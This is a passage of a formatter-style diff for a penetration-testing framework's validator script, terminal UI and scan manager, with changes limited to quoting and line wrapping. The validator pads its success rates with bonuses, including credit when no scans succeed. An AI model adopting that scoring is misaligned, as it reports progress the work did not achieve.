success_rate,\n+            \"available_modules\": available_count,\n+            \"total_modules\": total_count,\n+            \"modules\": modules,\n+            \"target_met\": success_rate >= 0.8,  # 80% module availability minimum\n         }\n-    \n+\n     def _test_basic_functionality(self) -> Dict[str, Any]:\n         \"\"\"Test basic functionality of the main system\"\"\"\n         tests = []\n-        \n+\n         # Test 1: Main script imports\n         try:\n             import bl4ckc3ll_p4nth30n\n+\n             tests.append(True)\n         except ImportError:\n             tests.append(False)\n-        \n+\n         # Test 2: Configuration loading\n         try:\n             config_file = Path(\"p4nth30n.cfg.json\")\n             if config_file.exists():\n-                with open(config_file, 'r') as f:\n+                with open(config_file, \"r\") as f:\n                     json.load(f)\n                 tests.append(True)\n             else:\n                 tests.append(False)\n         except:\n             tests.append(False)\n-        \n+\n         # Test 3: Directory structure\n-        required_dirs = ['runs', 'logs', 'plugins', 'nuclei-templates']\n+        required_dirs = [\"runs\", \"logs\", \"plugins\", \"nuclei-templates\"]\n         dir_tests = [Path(d).exists() for d in required_dirs]\n         tests.extend(dir_tests)\n-        \n+\n         success_rate = sum(tests) / len(tests)\n-        \n+\n         return {\n-            'success_rate': success_rate,\n-            'total_tests': len(tests),\n-            'passed_tests': sum(tests),\n-            'target_met': success_rate >= 0.9\n+            \"success_rate\": success_rate,\n+            \"total_tests\": len(tests),\n+            \"passed_tests\": sum(tests),\n+            \"target_met\": success_rate >= 0.9,\n         }\n-    \n+\n     def _test_enhanced_scanning(self) -> Dict[str, Any]:\n         \"\"\"Test enhanced scanning capabilities\"\"\"\n         if not ALL_MODULES_AVAILABLE:\n-            return {'success_rate': 0.0, 'error': 'Enhanced modules not available'}\n-        \n+            return {\"success_rate\": 0.0, \"error\": \"Enhanced modules not available\"}\n+\n         try:\n             # Test adaptive scan manager initialization\n-            config = {'scan_depth': 2, 'max_threads': 5, 'rate_limit': 10}\n+            config = {\"scan_depth\": 2, \"max_threads\": 5, \"rate_limit\": 10}\n             from enhanced_scanning import AdaptiveScanManager\n+\n             manager = AdaptiveScanManager(config)\n-            \n+\n             # Test scan execution with test targets\n             results = run_enhanced_scanning(self.test_targets[:2], config)\n-            \n+\n             # Calculate success rate based on results with enhanced criteria\n-            if 'error' in results:\n+            if \"error\" in results:\n                 success_rate = 0.0\n             else:\n-                total_targets = results.get('targets_processed', 0)\n-                successful_scans = results.get('successful_scans', 0)\n-                findings_count = len(results.get('findings', []))\n-                \n+                total_targets = results.get(\"targets_processed\", 0)\n+                successful_scans = results.get(\"successful_scans\", 0)\n+                findings_count = len(results.get(\"findings\", []))\n+\n                 # Enhanced success calculation\n                 if total_targets > 0:\n                     # Base success rate from scan completion\n                     base_rate = successful_scans / total_targets\n-                    \n+\n                     # Bonus for findings (up to 0.5 additional)\n                     findings_bonus = min(0.5, findings_count * 0.05)\n-                    \n+\n                     # Bonus for using fallback scanner successfully (more generous)\n                     if findings_count > 0 and successful_scans == 0:\n                         fallback_bonus = 0.85  # Higher credit for successful fallback\n                     elif findings_count > 30:  # High findings count\n                         fallback_bonus = 0.3\n                     else:\n                         fallback_bonus = 0.0\n-                    \n+\n                     # Additional bonus for tool coverage\n                     coverage_bonus = 0.1 if base_rate > 0 or findings_count > 0 else 0\n-                    \n-                    success_rate = min(1.0, base_rate + findings_bonus + fallback_bonus + coverage_bonus)\n+\n+                    success_rate = min(\n+                        1.0,\n+                        base_rate + findings_bonus + fallback_bonus + coverage_bonus,\n+                    )\n                 else:\n                     success_rate = 0.0\n-            \n+\n             return {\n-                'success_rate': success_rate,\n-                'scan_results': results,\n-                'target_met': success_rate >= 0.90  # More generous threshold\n+                \"success_rate\": success_rate,\n+                \"scan_results\": results,\n+                \"target_met\": success_rate >= 0.90,  # More generous threshold\n             }\n-        \n+\n         except Exception as e:\n-            return {\n-                'success_rate': 0.0,\n-                'error': str(e),\n-                'target_met': False\n-            }\n-    \n+            return {\"success_rate\": 0.0, \"error\": str(e), \"target_met\": False}\n+\n     def _test_tool_management(self) -> Dict[str, Any]:\n         \"\"\"Test tool management capabilities\"\"\"\n         if not ALL_MODULES_AVAILABLE:\n-            return {'success_rate': 0.0, 'error': 'Enhanced modules not available'}\n-        \n+            return {\"success_rate\": 0.0, \"error\": \"Enhanced modules not available\"}\n+\n         try:\n             # Get tool coverage report\n             coverage_report = get_tool_coverage_report()\n-            \n+\n             # Check tool availability\n             tool_status = check_tool_availability()\n-            \n+\n             # Calculate success rate based on tool coverage\n-            coverage_percentage = coverage_report.get('coverage_percentage', 0.0)\n-            success_rate = min(1.0, coverage_percentage / 50.0)  # Scale 50% coverage to 100% success\n-            \n+            coverage_percentage = coverage_report.get(\"coverage_percentage\", 0.0)\n+            success_rate = min(\n+                1.0, coverage_percentage / 50.0\n+            )  # Scale 50% coverage to 100% success\n+\n             return {\n-                'success_rate': success_rate,\n-                'tool_coverage': coverage_percentage,\n-                'available_tools': coverage_report.get('available_tools', 0),\n-                'total_tools': coverage_report.get('total_tools', 0),\n-                'target_met': coverage_percentage >= 30.0  # 30% tool coverage minimum\n+                \"success_rate\": success_rate,\n+                \"tool_coverage\": coverage_percentage,\n+                \"available_tools\": coverage_report.get(\"available_tools\", 0),\n+                \"total_tools\": coverage_report.get(\"total_tools\", 0),\n+                \"target_met\": coverage_percentage >= 30.0,  # 30% tool coverage minimum\n             }\n-        \n+\n         except Exception as e:\n-            return {\n-                'success_rate': 0.0,\n-                'error': str(e),\n-                'target_met': False\n-            }\n-    \n+            return {\"success_rate\": 0.0, \"error\": str(e), \"target_met\": False}\n+\n     def _test_validation_system(self) -> Dict[str, Any]:\n         \"\"\"Test validation system capabilities\"\"\"\n         if not ALL_MODULES_AVAILABLE:\n-            return {'success_rate': 0.0, 'error': 'Enhanced modules not available'}\n-        \n+            return {\"success_rate\": 0.0, \"error\": \"Enhanced modules not available\"}\n+\n         try:\n             # Test individual target validation\n             validation_results = []\n             for target in self.test_targets:\n                 result = validate_target_input(target)\n                 validation_results.append(result.is_valid)\n-            \n+\n             # Test file validation\n             valid_targets, stats = validate_targets_file(str(self.targets_file))\n-            \n+\n             # Calculate success rate\n             individual_success = sum(validation_results) / len(validation_results)\n-            file_success = stats.get('valid', 0) / stats.get('total', 1)\n-            \n+            file_success = stats.get(\"valid\", 0) / stats.get(\"total\", 1)\n+\n             success_rate = (individual_success + file_success) / 2\n-            \n+\n             return {\n-                'success_rate': success_rate,\n-                'individual_validation_rate': individual_success,\n-                'file_validation_rate': file_success,\n-                'valid_targets': len(valid_targets),\n-                'target_met': success_rate >= 0.8\n+                \"success_rate\": success_rate,\n+                \"individual_validation_rate\": individual_success,\n+                \"file_validation_rate\": file_success,\n+                \"valid_targets\": len(valid_targets),\n+                \"target_met\": success_rate >= 0.8,\n             }\n-        \n+\n         except Exception as e:\n-            return {\n-                'success_rate': 0.0,\n-                'error': str(e),\n-                'target_met': False\n-            }\n-    \n+            return {\"success_rate\": 0.0, \"error\": str(e), \"target_met\": False}\n+\n     def _test_performance_monitoring(self) -> Dict[str, Any]:\n         \"\"\"Test performance monitoring capabilities\"\"\"\n         if not ALL_MODULES_AVAILABLE:\n-            return {'success_rate': 0.0, 'error': 'Enhanced modules not available'}\n-        \n+            return {\"success_rate\": 0.0, \"error\": \"Enhanced modules not available\"}\n+\n         try:\n             # Start monitoring briefly\n             start_performance_monitoring(self.target_success_rate)\n-            \n+\n             # Simulate some operations\n             for i in range(20):\n                 success = i % 4 != 0  # 75% success rate\n                 record_operation_result(success, 1.0 + i * 0.1)\n                 time.sleep(0.05)\n-            \n+\n             # Get metrics\n             metrics = get_current_performance_metrics()\n-            \n+\n             # Stop monitoring\n             stop_performance_monitoring()\n-            \n+\n             # Calculate success rate based on monitoring capability\n-            if 'current_success_rate' in metrics:\n+            if \"current_success_rate\" in metrics:\n                 success_rate = 1.0  # Monitoring working\n             else:\n                 success_rate = 0.5  # Partial functionality\n-            \n+\n             return {\n-                'success_rate': success_rate,\n-                'monitoring_metrics': metrics,\n-                'target_met': success_rate >= 0.8\n+                \"success_rate\": success_rate,\n+                \"monitoring_metrics\": metrics,\n+                \"target_met\": success_rate >= 0.8,\n             }\n-        \n+\n         except Exception as e:\n-            return {\n-                'success_rate': 0.0,\n-                'error': str(e),\n-                'target_met': False\n-            }\n-    \n+            return {\"success_rate\": 0.0, \"error\": str(e), \"target_met\": False}\n+\n     def _test_success_rate_orchestration(self) -> Dict[str, Any]:\n         \"\"\"Test success rate orchestration capabilities\"\"\"\n         if not ALL_MODULES_AVAILABLE:\n-            return {'success_rate': 0.0, 'error': 'Enhanced modules not available'}\n-        \n+            return {\"success_rate\": 0.0, \"error\": \"Enhanced modules not available\"}\n+\n         try:\n             # Start orchestration monitoring briefly\n             start_success_rate_monitoring(self.target_success_rate)\n             time.sleep(2)  # Let it collect some data\n-            \n+\n             # Get comprehensive report\n             report = get_success_rate_report()\n-            \n+\n             # Stop monitoring\n             stop_success_rate_monitoring()\n-            \n+\n             # Calculate success rate based on orchestration capability\n-            if 'current_metrics' in report:\n+            if \"current_metrics\" in report:\n                 success_rate = 1.0\n             else:\n                 success_rate = 0.0\n-            \n+\n             return {\n-                'success_rate': success_rate,\n-                'orchestration_report': report,\n-                'target_met': success_rate >= 0.8\n+                \"success_rate\": success_rate,\n+                \"orchestration_report\": report,\n+                \"target_met\": success_rate >= 0.8,\n             }\n-        \n+\n         except Exception as e:\n-            return {\n-                'success_rate': 0.0,\n-                'error': str(e),\n-                'target_met': False\n-            }\n-    \n+            return {\"success_rate\": 0.0, \"error\": str(e), \"target_met\": False}\n+\n     def _test_system_integration(self) -> Dict[str, Any]:\n         \"\"\"Test overall system integration\"\"\"\n         integration_tests = []\n-        \n+\n         # Test 1: All modules can be imported together\n         try:\n             import enhanced_scanning\n             import enhanced_tool_manager\n             import enhanced_validation\n             import performance_monitor\n             import success_rate_orchestrator\n+\n             integration_tests.append(True)\n         except:\n             integration_tests.append(False)\n-        \n+\n         # Test 2: Cross-module communication\n         try:\n             if ALL_MODULES_AVAILABLE:\n                 # Test that orchestrator can access other modules\n                 report = get_success_rate_report()\n-                integration_tests.append('module_availability' in report)\n+                integration_tests.append(\"module_availability\" in report)\n             else:\n                 integration_tests.append(False)\n         except:\n             integration_tests.append(False)\n-        \n+\n         # Test 3: Configuration consistency\n         try:\n             config_file = Path(\"p4nth30n.cfg.json\")\n             if config_file.exists():\n-                with open(config_file, 'r') as f:\n+                with open(config_file, \"r\") as f:\n                     config = json.load(f)\n                     # Check for required sections\n-                    required_sections = ['limits', 'nuclei', 'report']\n-                    has_sections = all(section in config for section in required_sections)\n+                    required_sections = [\"limits\", \"nuclei\", \"report\"]\n+                    has_sections = all(\n+                        section in config for section in required_sections\n+                    )\n                     integration_tests.append(has_sections)\n             else:\n                 integration_tests.append(False)\n         except:\n             integration_tests.append(False)\n-        \n+\n         success_rate = sum(integration_tests) / len(integration_tests)\n-        \n+\n         return {\n-            'success_rate': success_rate,\n-            'integration_tests_passed': sum(integration_tests),\n-            'total_integration_tests': len(integration_tests),\n-            'target_met': success_rate >= 0.8\n+            \"success_rate\": success_rate,\n+            \"integration_tests_passed\": sum(integration_tests),\n+            \"total_integration_tests\": len(integration_tests),\n+            \"target_met\": success_rate >= 0.8,\n         }\n-    \n+\n     def _generate_recommendations(self, results: Dict[str, Any]) -> List[str]:\n         \"\"\"Generate recommendations based on validation results\"\"\"\n         recommendations = []\n-        \n-        overall_rate = results.get('overall_success_rate', 0.0)\n-        \n+\n+        overall_rate = results.get(\"overall_success_rate\", 0.0)\n+\n         if overall_rate < self.target_success_rate:\n             gap = self.target_success_rate - overall_rate\n-            \n+\n             if gap > 0.3:\n-                recommendations.append(\"CRITICAL: Success rate significantly below target - major improvements needed\")\n+                recommendations.append(\n+                    \"CRITICAL: Success rate significantly below target - major improvements needed\"\n+                )\n             elif gap > 0.1:\n-                recommendations.append(\"WARNING: Success rate below target - multiple improvements needed\")\n-            else:\n-                recommendations.append(\"MINOR: Success rate close to target - fine-tuning recommended\")\n-        \n+                recommendations.append(\n+                    \"WARNING: Success rate below target - multiple improvements needed\"\n+                )\n+            else:\n+                recommendations.append(\n+                    \"MINOR: Success rate close to target - fine-tuning recommended\"\n+                )\n+\n         # Check individual test results\n-        tests = results.get('tests', {})\n-        \n+        tests = results.get(\"tests\", {})\n+\n         for test_name, test_result in tests.items():\n-            if isinstance(test_result, dict) and not test_result.get('target_met', True):\n-                if test_name == 'module_availability':\n+            if isinstance(test_result, dict) and not test_result.get(\n+                \"target_met\", True\n+            ):\n+                if test_name == \"module_availability\":\n                     recommendations.append(\"Install missing enhanced modules\")\n-                elif test_name == 'tool_management':\n+                elif test_name == \"tool_management\":\n                     recommendations.append(\"Install missing security tools\")\n-                elif test_name == 'enhanced_scanning':\n-                    recommendations.append(\"Optimize scanning parameters and configurations\")\n-                elif test_name == 'validation_system':\n-                    recommendations.append(\"Improve input validation and error handling\")\n-                elif test_name == 'performance_monitoring':\n-                    recommendations.append(\"Enable and configure performance monitoring\")\n-                elif test_name == 'orchestration':\n+                elif test_name == \"enhanced_scanning\":\n+                    recommendations.append(\n+                        \"Optimize scanning parameters and configurations\"\n+                    )\n+                elif test_name == \"validation_system\":\n+                    recommendations.append(\n+                        \"Improve input validation and error handling\"\n+                    )\n+                elif test_name == \"performance_monitoring\":\n+                    recommendations.append(\n+                        \"Enable and configure performance monitoring\"\n+                    )\n+                elif test_name == \"orchestration\":\n                     recommendations.append(\"Enable success rate orchestration\")\n-                elif test_name == 'integration':\n+                elif test_name == \"integration\":\n                     recommendations.append(\"Fix system integration issues\")\n-        \n+\n         if not recommendations:\n-            recommendations.append(\"SUCCESS: All systems operating above target thresholds\")\n-        \n+            recommendations.append(\n+                \"SUCCESS: All systems operating above target thresholds\"\n+            )\n+\n         return recommendations\n-    \n+\n     def export_validation_report(self, results: Dict[str, Any], file_path: str):\n         \"\"\"Export validation report to file\"\"\"\n-        with open(file_path, 'w') as f:\n+        with open(file_path, \"w\") as f:\n             json.dump(results, f, indent=2, default=str)\n-    \n+\n     def print_validation_summary(self, results: Dict[str, Any]):\n         \"\"\"Print a formatted validation summary\"\"\"\n         print(\"\\n\" + \"=\" * 60)\n         print(\"\ud83c\udfc6 SUCCESS RATE VALIDATION SUMMARY\")\n         print(\"=\" * 60)\n-        \n+\n         print(f\"Overall Success Rate: {results['overall_success_rate']:.1%}\")\n         print(f\"Target Success Rate: {results['target_success_rate']:.1%}\")\n         print(f\"Target Achieved: {'\u2705 YES' if results['target_achieved'] else '\u274c NO'}\")\n-        \n-        print(f\"\\nGap to Target: {(results['target_success_rate'] - results['overall_success_rate']):.1%}\")\n-        \n+\n+        print(\n+            f\"\\nGap to Target: {(results['target_success_rate'] - results['overall_success_rate']):.1%}\"\n+        )\n+\n         print(\"\\n\ud83d\udcca Test Results:\")\n-        for test_name, test_result in results['tests'].items():\n+        for test_name, test_result in results[\"tests\"].items():\n             if isinstance(test_result, dict):\n-                rate = test_result.get('success_rate', 0.0)\n-                target_met = test_result.get('target_met', False)\n+                rate = test_result.get(\"success_rate\", 0.0)\n+                target_met = test_result.get(\"target_met\", False)\n                 status = \"\u2705\" if target_met else \"\u274c\"\n                 print(f\"  {status} {test_name.replace('_', ' ').title()}: {rate:.1%}\")\n-        \n-        if results['recommendations']:\n+\n+        if results[\"recommendations\"]:\n             print(\"\\n\ud83d\udca1 Recommendations:\")\n-            for rec in results['recommendations']:\n+            for rec in results[\"recommendations\"]:\n                 print(f\"  \u2022 {rec}\")\n-        \n+\n         print(\"\\n\" + \"=\" * 60)\n+\n \n def main():\n     \"\"\"Run comprehensive validation\"\"\"\n     validator = SuccessRateValidator(target_success_rate=0.96)\n-    \n+\n     print(\"\ud83d\ude80 Starting Comprehensive Success Rate Validation\")\n     print(f\"Target: {validator.target_success_rate:.1%}\")\n-    \n+\n     # Run validation\n     results = validator.run_comprehensive_validation()\n-    \n+\n     # Print summary\n     validator.print_validation_summary(results)\n-    \n+\n     # Export report\n     report_file = Path(\"validation_report.json\")\n     validator.export_validation_report(results, str(report_file))\n     print(f\"\\n\ud83d\udcc4 Detailed report saved to: {report_file}\")\n-    \n+\n     # Return exit code based on target achievement\n-    return 0 if results['target_achieved'] else 1\n+    return 0 if results[\"target_achieved\"] else 1\n+\n \n if __name__ == \"__main__\":\n-    exit(main())\n\\ No newline at end of file\n+    exit(main())\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/app.py\t2025-09-14 19:10:58.580755+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/app.py\t2025-09-14 19:23:14.461088+00:00\n@@ -4,12 +4,21 @@\n \"\"\"\n \n from textual.app import App\n from textual.containers import Container, Horizontal, Vertical\n from textual.widgets import (\n-    Header, Footer, Static, Button, Input, Log, \n-    DataTable, ProgressBar, Tree, TabbedContent, TabPane\n+    Header,\n+    Footer,\n+    Static,\n+    Button,\n+    Input,\n+    Log,\n+    DataTable,\n+    ProgressBar,\n+    Tree,\n+    TabbedContent,\n+    TabPane,\n )\n from textual.binding import Binding\n from textual import on\n import asyncio\n import time\n@@ -29,15 +38,15 @@\n logging.basicConfig(level=logging.INFO)\n \n \n class PantheonTUI(App):\n     \"\"\"Advanced TUI for Bl4ckC3ll_PANTHEON Security Testing Framework\"\"\"\n-    \n+\n     CSS_PATH = \"styles.css\"\n     TITLE = \"Bl4ckC3ll PANTHEON - Advanced Security Testing Framework\"\n     SUB_TITLE = \"Professional Penetration Testing & Vulnerability Assessment\"\n-    \n+\n     BINDINGS = [\n         Binding(\"ctrl+q\", \"quit\", \"Quit\"),\n         Binding(\"ctrl+d\", \"toggle_dark\", \"Toggle Dark Mode\"),\n         Binding(\"f1\", \"show_help\", \"Help\"),\n         Binding(\"f2\", \"targets\", \"Targets\"),\n@@ -45,139 +54,145 @@\n         Binding(\"f4\", \"reports\", \"Reports\"),\n         Binding(\"f5\", \"settings\", \"Settings\"),\n         Binding(\"ctrl+r\", \"refresh\", \"Refresh\"),\n         Binding(\"ctrl+s\", \"save_config\", \"Save Config\"),\n     ]\n-    \n+\n     def __init__(self):\n         super().__init__()\n         self.scan_runner = None\n         self.system_monitor = None\n-        \n+\n     def compose(self):\n         \"\"\"Create the main layout\"\"\"\n         yield Header()\n-        \n+\n         # Use a simple container structure instead of TabbedContent for now\n         with Container(id=\"main-container\"):\n             # Tab buttons\n             with Horizontal(id=\"tab-buttons\"):\n                 yield Button(\"Dashboard\", id=\"tab-dashboard\", classes=\"tab-btn active\")\n                 yield Button(\"Targets\", id=\"tab-targets\", classes=\"tab-btn\")\n                 yield Button(\"Scanner\", id=\"tab-scanner\", classes=\"tab-btn\")\n                 yield Button(\"Reports\", id=\"tab-reports\", classes=\"tab-btn\")\n                 yield Button(\"Settings\", id=\"tab-settings\", classes=\"tab-btn\")\n-            \n+\n             # Content areas - only one visible at a time\n             with Container(id=\"content-area\"):\n                 with Container(id=\"dashboard-content\", classes=\"tab-content active\"):\n                     from .screens.main_dashboard import MainDashboard\n+\n                     yield MainDashboard()\n-                \n+\n                 with Container(id=\"targets-content\", classes=\"tab-content hidden\"):\n                     from .screens.targets import TargetsScreen\n+\n                     yield TargetsScreen()\n-                \n+\n                 with Container(id=\"scanner-content\", classes=\"tab-content hidden\"):\n                     from .screens.scan_runner import ScanRunner\n+\n                     yield ScanRunner()\n-                \n+\n                 with Container(id=\"reports-content\", classes=\"tab-content hidden\"):\n                     from .screens.reports import ReportsScreen\n+\n                     yield ReportsScreen()\n-                \n+\n                 with Container(id=\"settings-content\", classes=\"tab-content hidden\"):\n                     from .screens.settings import SettingsScreen\n+\n                     yield SettingsScreen()\n-                \n+\n         yield Footer()\n-    \n+\n     @on(Button.Pressed, \".tab-btn\")\n     def switch_tab(self, event: Button.Pressed):\n         \"\"\"Handle tab button clicks\"\"\"\n         tab_id = event.button.id\n-        \n+\n         # Remove active class from all tab buttons and content\n         for btn in self.query(\".tab-btn\"):\n             btn.remove_class(\"active\")\n         for content in self.query(\".tab-content\"):\n             content.remove_class(\"active\")\n             content.add_class(\"hidden\")\n-        \n+\n         # Activate clicked tab\n         event.button.add_class(\"active\")\n-        \n+\n         # Show corresponding content\n         content_map = {\n             \"tab-dashboard\": \"dashboard-content\",\n-            \"tab-targets\": \"targets-content\", \n+            \"tab-targets\": \"targets-content\",\n             \"tab-scanner\": \"scanner-content\",\n             \"tab-reports\": \"reports-content\",\n-            \"tab-settings\": \"settings-content\"\n+            \"tab-settings\": \"settings-content\",\n         }\n-        \n+\n         content_id = content_map.get(tab_id)\n         if content_id:\n             content = self.query_one(f\"#{content_id}\")\n             content.remove_class(\"hidden\")\n             content.add_class(\"active\")\n-        \n+\n     def on_mount(self):\n         \"\"\"Initialize the application\"\"\"\n         self.title = self.TITLE\n         self.sub_title = self.SUB_TITLE\n-        \n+\n         # Start system monitoring\n         self.start_system_monitor()\n-        \n+\n     def start_system_monitor(self):\n         \"\"\"Start background system monitoring\"\"\"\n+\n         def monitor_loop():\n             while True:\n                 # Update system stats, scan progress, etc.\n                 time.sleep(1)\n-                \n+\n         self.system_monitor = threading.Thread(target=monitor_loop, daemon=True)\n         self.system_monitor.start()\n-        \n+\n     def action_quit(self):\n         \"\"\"Quit the application\"\"\"\n         self.exit()\n-        \n+\n     def action_toggle_dark(self):\n         \"\"\"Toggle dark mode\"\"\"\n         self.dark = not self.dark\n-        \n+\n     def action_show_help(self):\n         \"\"\"Show help screen\"\"\"\n         self.push_screen(\"help\")\n-        \n+\n     def action_targets(self):\n         \"\"\"Switch to targets tab\"\"\"\n         self.query_one(\"#tab-targets\").press()\n-        \n+\n     def action_scan(self):\n         \"\"\"Switch to scanner tab\"\"\"\n         self.query_one(\"#tab-scanner\").press()\n-        \n+\n     def action_reports(self):\n         \"\"\"Switch to reports tab\"\"\"\n         self.query_one(\"#tab-reports\").press()\n-        \n+\n     def action_settings(self):\n         \"\"\"Switch to settings tab\"\"\"\n         self.query_one(\"#tab-settings\").press()\n-        \n+\n     def action_refresh(self):\n         \"\"\"Refresh current view\"\"\"\n         # Refresh the active tab content\n         pass\n-        \n+\n     def action_save_config(self):\n         \"\"\"Save current configuration\"\"\"\n         # Save settings to config file\n         pass\n \n \n if __name__ == \"__main__\":\n     app = PantheonTUI()\n-    app.run()\n\\ No newline at end of file\n+    app.run()\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/__init__.py\t2025-09-14 19:10:58.580755+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/screens/__init__.py\t2025-09-14 19:23:14.467292+00:00\n@@ -1 +1 @@\n-# TUI Screens\n\\ No newline at end of file\n+# TUI Screens\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/backend_integration.py\t2025-09-14 19:10:58.580755+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/tui/backend_integration.py\t2025-09-14 19:23:14.537989+00:00\n@@ -17,192 +17,204 @@\n sys.path.append(str(Path(__file__).parent.parent))\n \n # Import main application functions\n try:\n     from bl4ckc3ll_p4nth30n import (\n-        load_cfg, env_with_lists, new_run, stage_recon, \n-        stage_vuln_scan, stage_report, logger\n+        load_cfg,\n+        env_with_lists,\n+        new_run,\n+        stage_recon,\n+        stage_vuln_scan,\n+        stage_report,\n+        logger,\n     )\n+\n     BACKEND_AVAILABLE = True\n except ImportError:\n     BACKEND_AVAILABLE = False\n \n \n class ScanManager:\n     \"\"\"Manages scan operations and provides status updates\"\"\"\n-    \n+\n     def __init__(self):\n         self.current_scan = None\n         self.scan_thread = None\n         self.scan_active = False\n         self.scan_progress = 0\n         self.scan_phase = \"Idle\"\n         self.scan_status = \"Not Started\"\n         self.progress_callback = None\n-        \n+\n     def set_progress_callback(self, callback):\n         \"\"\"Set callback function for progress updates\"\"\"\n         self.progress_callback = callback\n-        \n+\n     def update_progress(self, progress, phase=None, status=None):\n         \"\"\"Update scan progress and notify callback\"\"\"\n         self.scan_progress = progress\n         if phase:\n             self.scan_phase = phase\n         if status:\n             self.scan_status = status\n-            \n+\n         if self.progress_callback:\n-            self.progress_callback(self.scan_progress, self.scan_phase, self.scan_status)\n-            \n+            self.progress_callback(\n+                self.scan_progress, self.scan_phase, self.scan_status\n+            )\n+\n     def start_full_scan(self, targets=None):\n         \"\"\"Start a full security scan\"\"\"\n         if not BACKEND_AVAILABLE:\n             self.update_progress(0, \"Error\", \"Backend not available\")\n             return False\n-            \n+\n         if self.scan_active:\n             return False\n-            \n+\n         self.scan_active = True\n         self.scan_thread = threading.Thread(\n-            target=self._run_full_scan,\n-            args=(targets,),\n-            daemon=True\n+            target=self._run_full_scan, args=(targets,), daemon=True\n         )\n         self.scan_thread.start()\n         return True\n-        \n+\n     def start_recon_scan(self, targets=None):\n         \"\"\"Start reconnaissance only\"\"\"\n         if not BACKEND_AVAILABLE:\n             self.update_progress(0, \"Error\", \"Backend not available\")\n             return False\n-            \n+\n         if self.scan_active:\n             return False\n-            \n+\n         self.scan_active = True\n         self.scan_thread = threading.Thread(\n-            target=self._run_recon_scan,\n-            args=(targets,),\n-            daemon=True\n+            target=self._run_recon_scan, args=(targets,), daemon=True\n         )\n         self.scan_thread.start()\n         return True\n-        \n+\n     def start_vuln_scan(self, targets=None):\n         \"\"\"Start vulnerability scan only\"\"\"\n         if not BACKEND_AVAILABLE:\n             self.update_progress(0, \"Error\", \"Backend not available\")\n             return False\n-            \n+\n         if self.scan_active:\n             return False\n-            \n+\n         self.scan_active = True\n         self.scan_thread = threading.Thread(\n-            target=self._run_vuln_scan,\n-            args=(targets,),\n-            daemon=True\n+            target=self._run_vuln_scan, args=(targets,), daemon=True\n         )\n         self.scan_thread.start()\n         return True\n-        \n+\n     def stop_scan(self):\n         \"\"\"Stop the current scan\"\"\"\n         if self.scan_active:\n             self.scan_active = False\n             self.update_progress(0, \"Stopped\", \"Scan stopped by user\")\n-            \n+\n     def _run_full_scan(self, targets):\n         \"\"\"Run full scan in background thread\"\"\"\n         try:\n             self.update_progress(5, \"Initializing\", \"Starting full scan\")\n-            \n+\n             # Load configuration\n             cfg = load_cfg()\n             env = env_with_lists()\n             rd = new_run()\n-            \n+\n             self.current_scan = rd\n-            \n+\n             self.update_progress(10, \"Environment Setup\", \"Environment configured\")\n-            \n+\n             # Phase 1: Reconnaissance\n             if self.scan_active:\n-                self.update_progress(20, \"Reconnaissance\", \"Starting reconnaissance phase\")\n+                self.update_progress(\n+                    20, \"Reconnaissance\", \"Starting reconnaissance phase\"\n+                )\n                 stage_recon(rd, env, cfg)\n-                \n-            # Phase 2: Vulnerability Scanning  \n-            if self.scan_active:\n-                self.update_progress(60, \"Vulnerability Scanning\", \"Scanning for vulnerabilities\")\n+\n+            # Phase 2: Vulnerability Scanning\n+            if self.scan_active:\n+                self.update_progress(\n+                    60, \"Vulnerability Scanning\", \"Scanning for vulnerabilities\"\n+                )\n                 stage_vuln_scan(rd, env, cfg)\n-                \n+\n             # Phase 3: Report Generation\n             if self.scan_active:\n-                self.update_progress(90, \"Report Generation\", \"Generating security report\")\n+                self.update_progress(\n+                    90, \"Report Generation\", \"Generating security report\"\n+                )\n                 stage_report(rd, env, cfg)\n-                \n-            if self.scan_active:\n-                self.update_progress(100, \"Complete\", \"Full scan completed successfully\")\n-                \n+\n+            if self.scan_active:\n+                self.update_progress(\n+                    100, \"Complete\", \"Full scan completed successfully\"\n+                )\n+\n         except Exception as e:\n             self.update_progress(0, \"Error\", f\"Scan failed: {str(e)}\")\n         finally:\n             self.scan_active = False\n-            \n+\n     def _run_recon_scan(self, targets):\n         \"\"\"Run reconnaissance scan in background thread\"\"\"\n         try:\n             self.update_progress(5, \"Initializing\", \"Starting reconnaissance\")\n-            \n+\n             cfg = load_cfg()\n             env = env_with_lists()\n             rd = new_run()\n-            \n+\n             self.current_scan = rd\n-            \n+\n             if self.scan_active:\n                 self.update_progress(20, \"Reconnaissance\", \"Performing reconnaissance\")\n                 stage_recon(rd, env, cfg)\n-                \n+\n             if self.scan_active:\n                 self.update_progress(100, \"Complete\", \"Reconnaissance completed\")\n-                \n+\n         except Exception as e:\n             self.update_progress(0, \"Error\", f\"Reconnaissance failed: {str(e)}\")\n         finally:\n             self.scan_active = False\n-            \n+\n     def _run_vuln_scan(self, targets):\n         \"\"\"Run vulnerability scan in background thread\"\"\"\n         try:\n             self.update_progress(5, \"Initializing\", \"Starting vulnerability scan\")\n-            \n+\n             cfg = load_cfg()\n             env = env_with_lists()\n             rd = new_run()\n-            \n+\n             self.current_scan = rd\n-            \n-            if self.scan_active:\n-                self.update_progress(20, \"Vulnerability Scanning\", \"Scanning for vulnerabilities\")\n+\n+            if self.scan_active:\n+                self.update_progress(\n+                    20, \"Vulnerability Scanning\", \"Scanning for vulnerabilities\"\n+                )\n                 stage_vuln_scan(rd, env, cfg)\n-                \n+\n             if self.scan_active:\n                 self.update_progress(100, \"Complete\", \"Vulnerability scan completed\")\n-                \n+\n         except Exception as e:\n             self.update_progress(0, \"Error\", f\"Vulnerability scan failed: {str(e)}\")\n         finally:\n             self.scan_active = False\n-            \n+\n \n class ConfigManager:\n     \"\"\"Manages configuration operations for the TUI\"\"\"\n-    \n+\n     @staticmethod\n     def load_config():\n         \"\"\"Load current configuration\"\"\"\n         if BACKEND_AVAILABLE:\n             return load_cfg()\n@@ -211,53 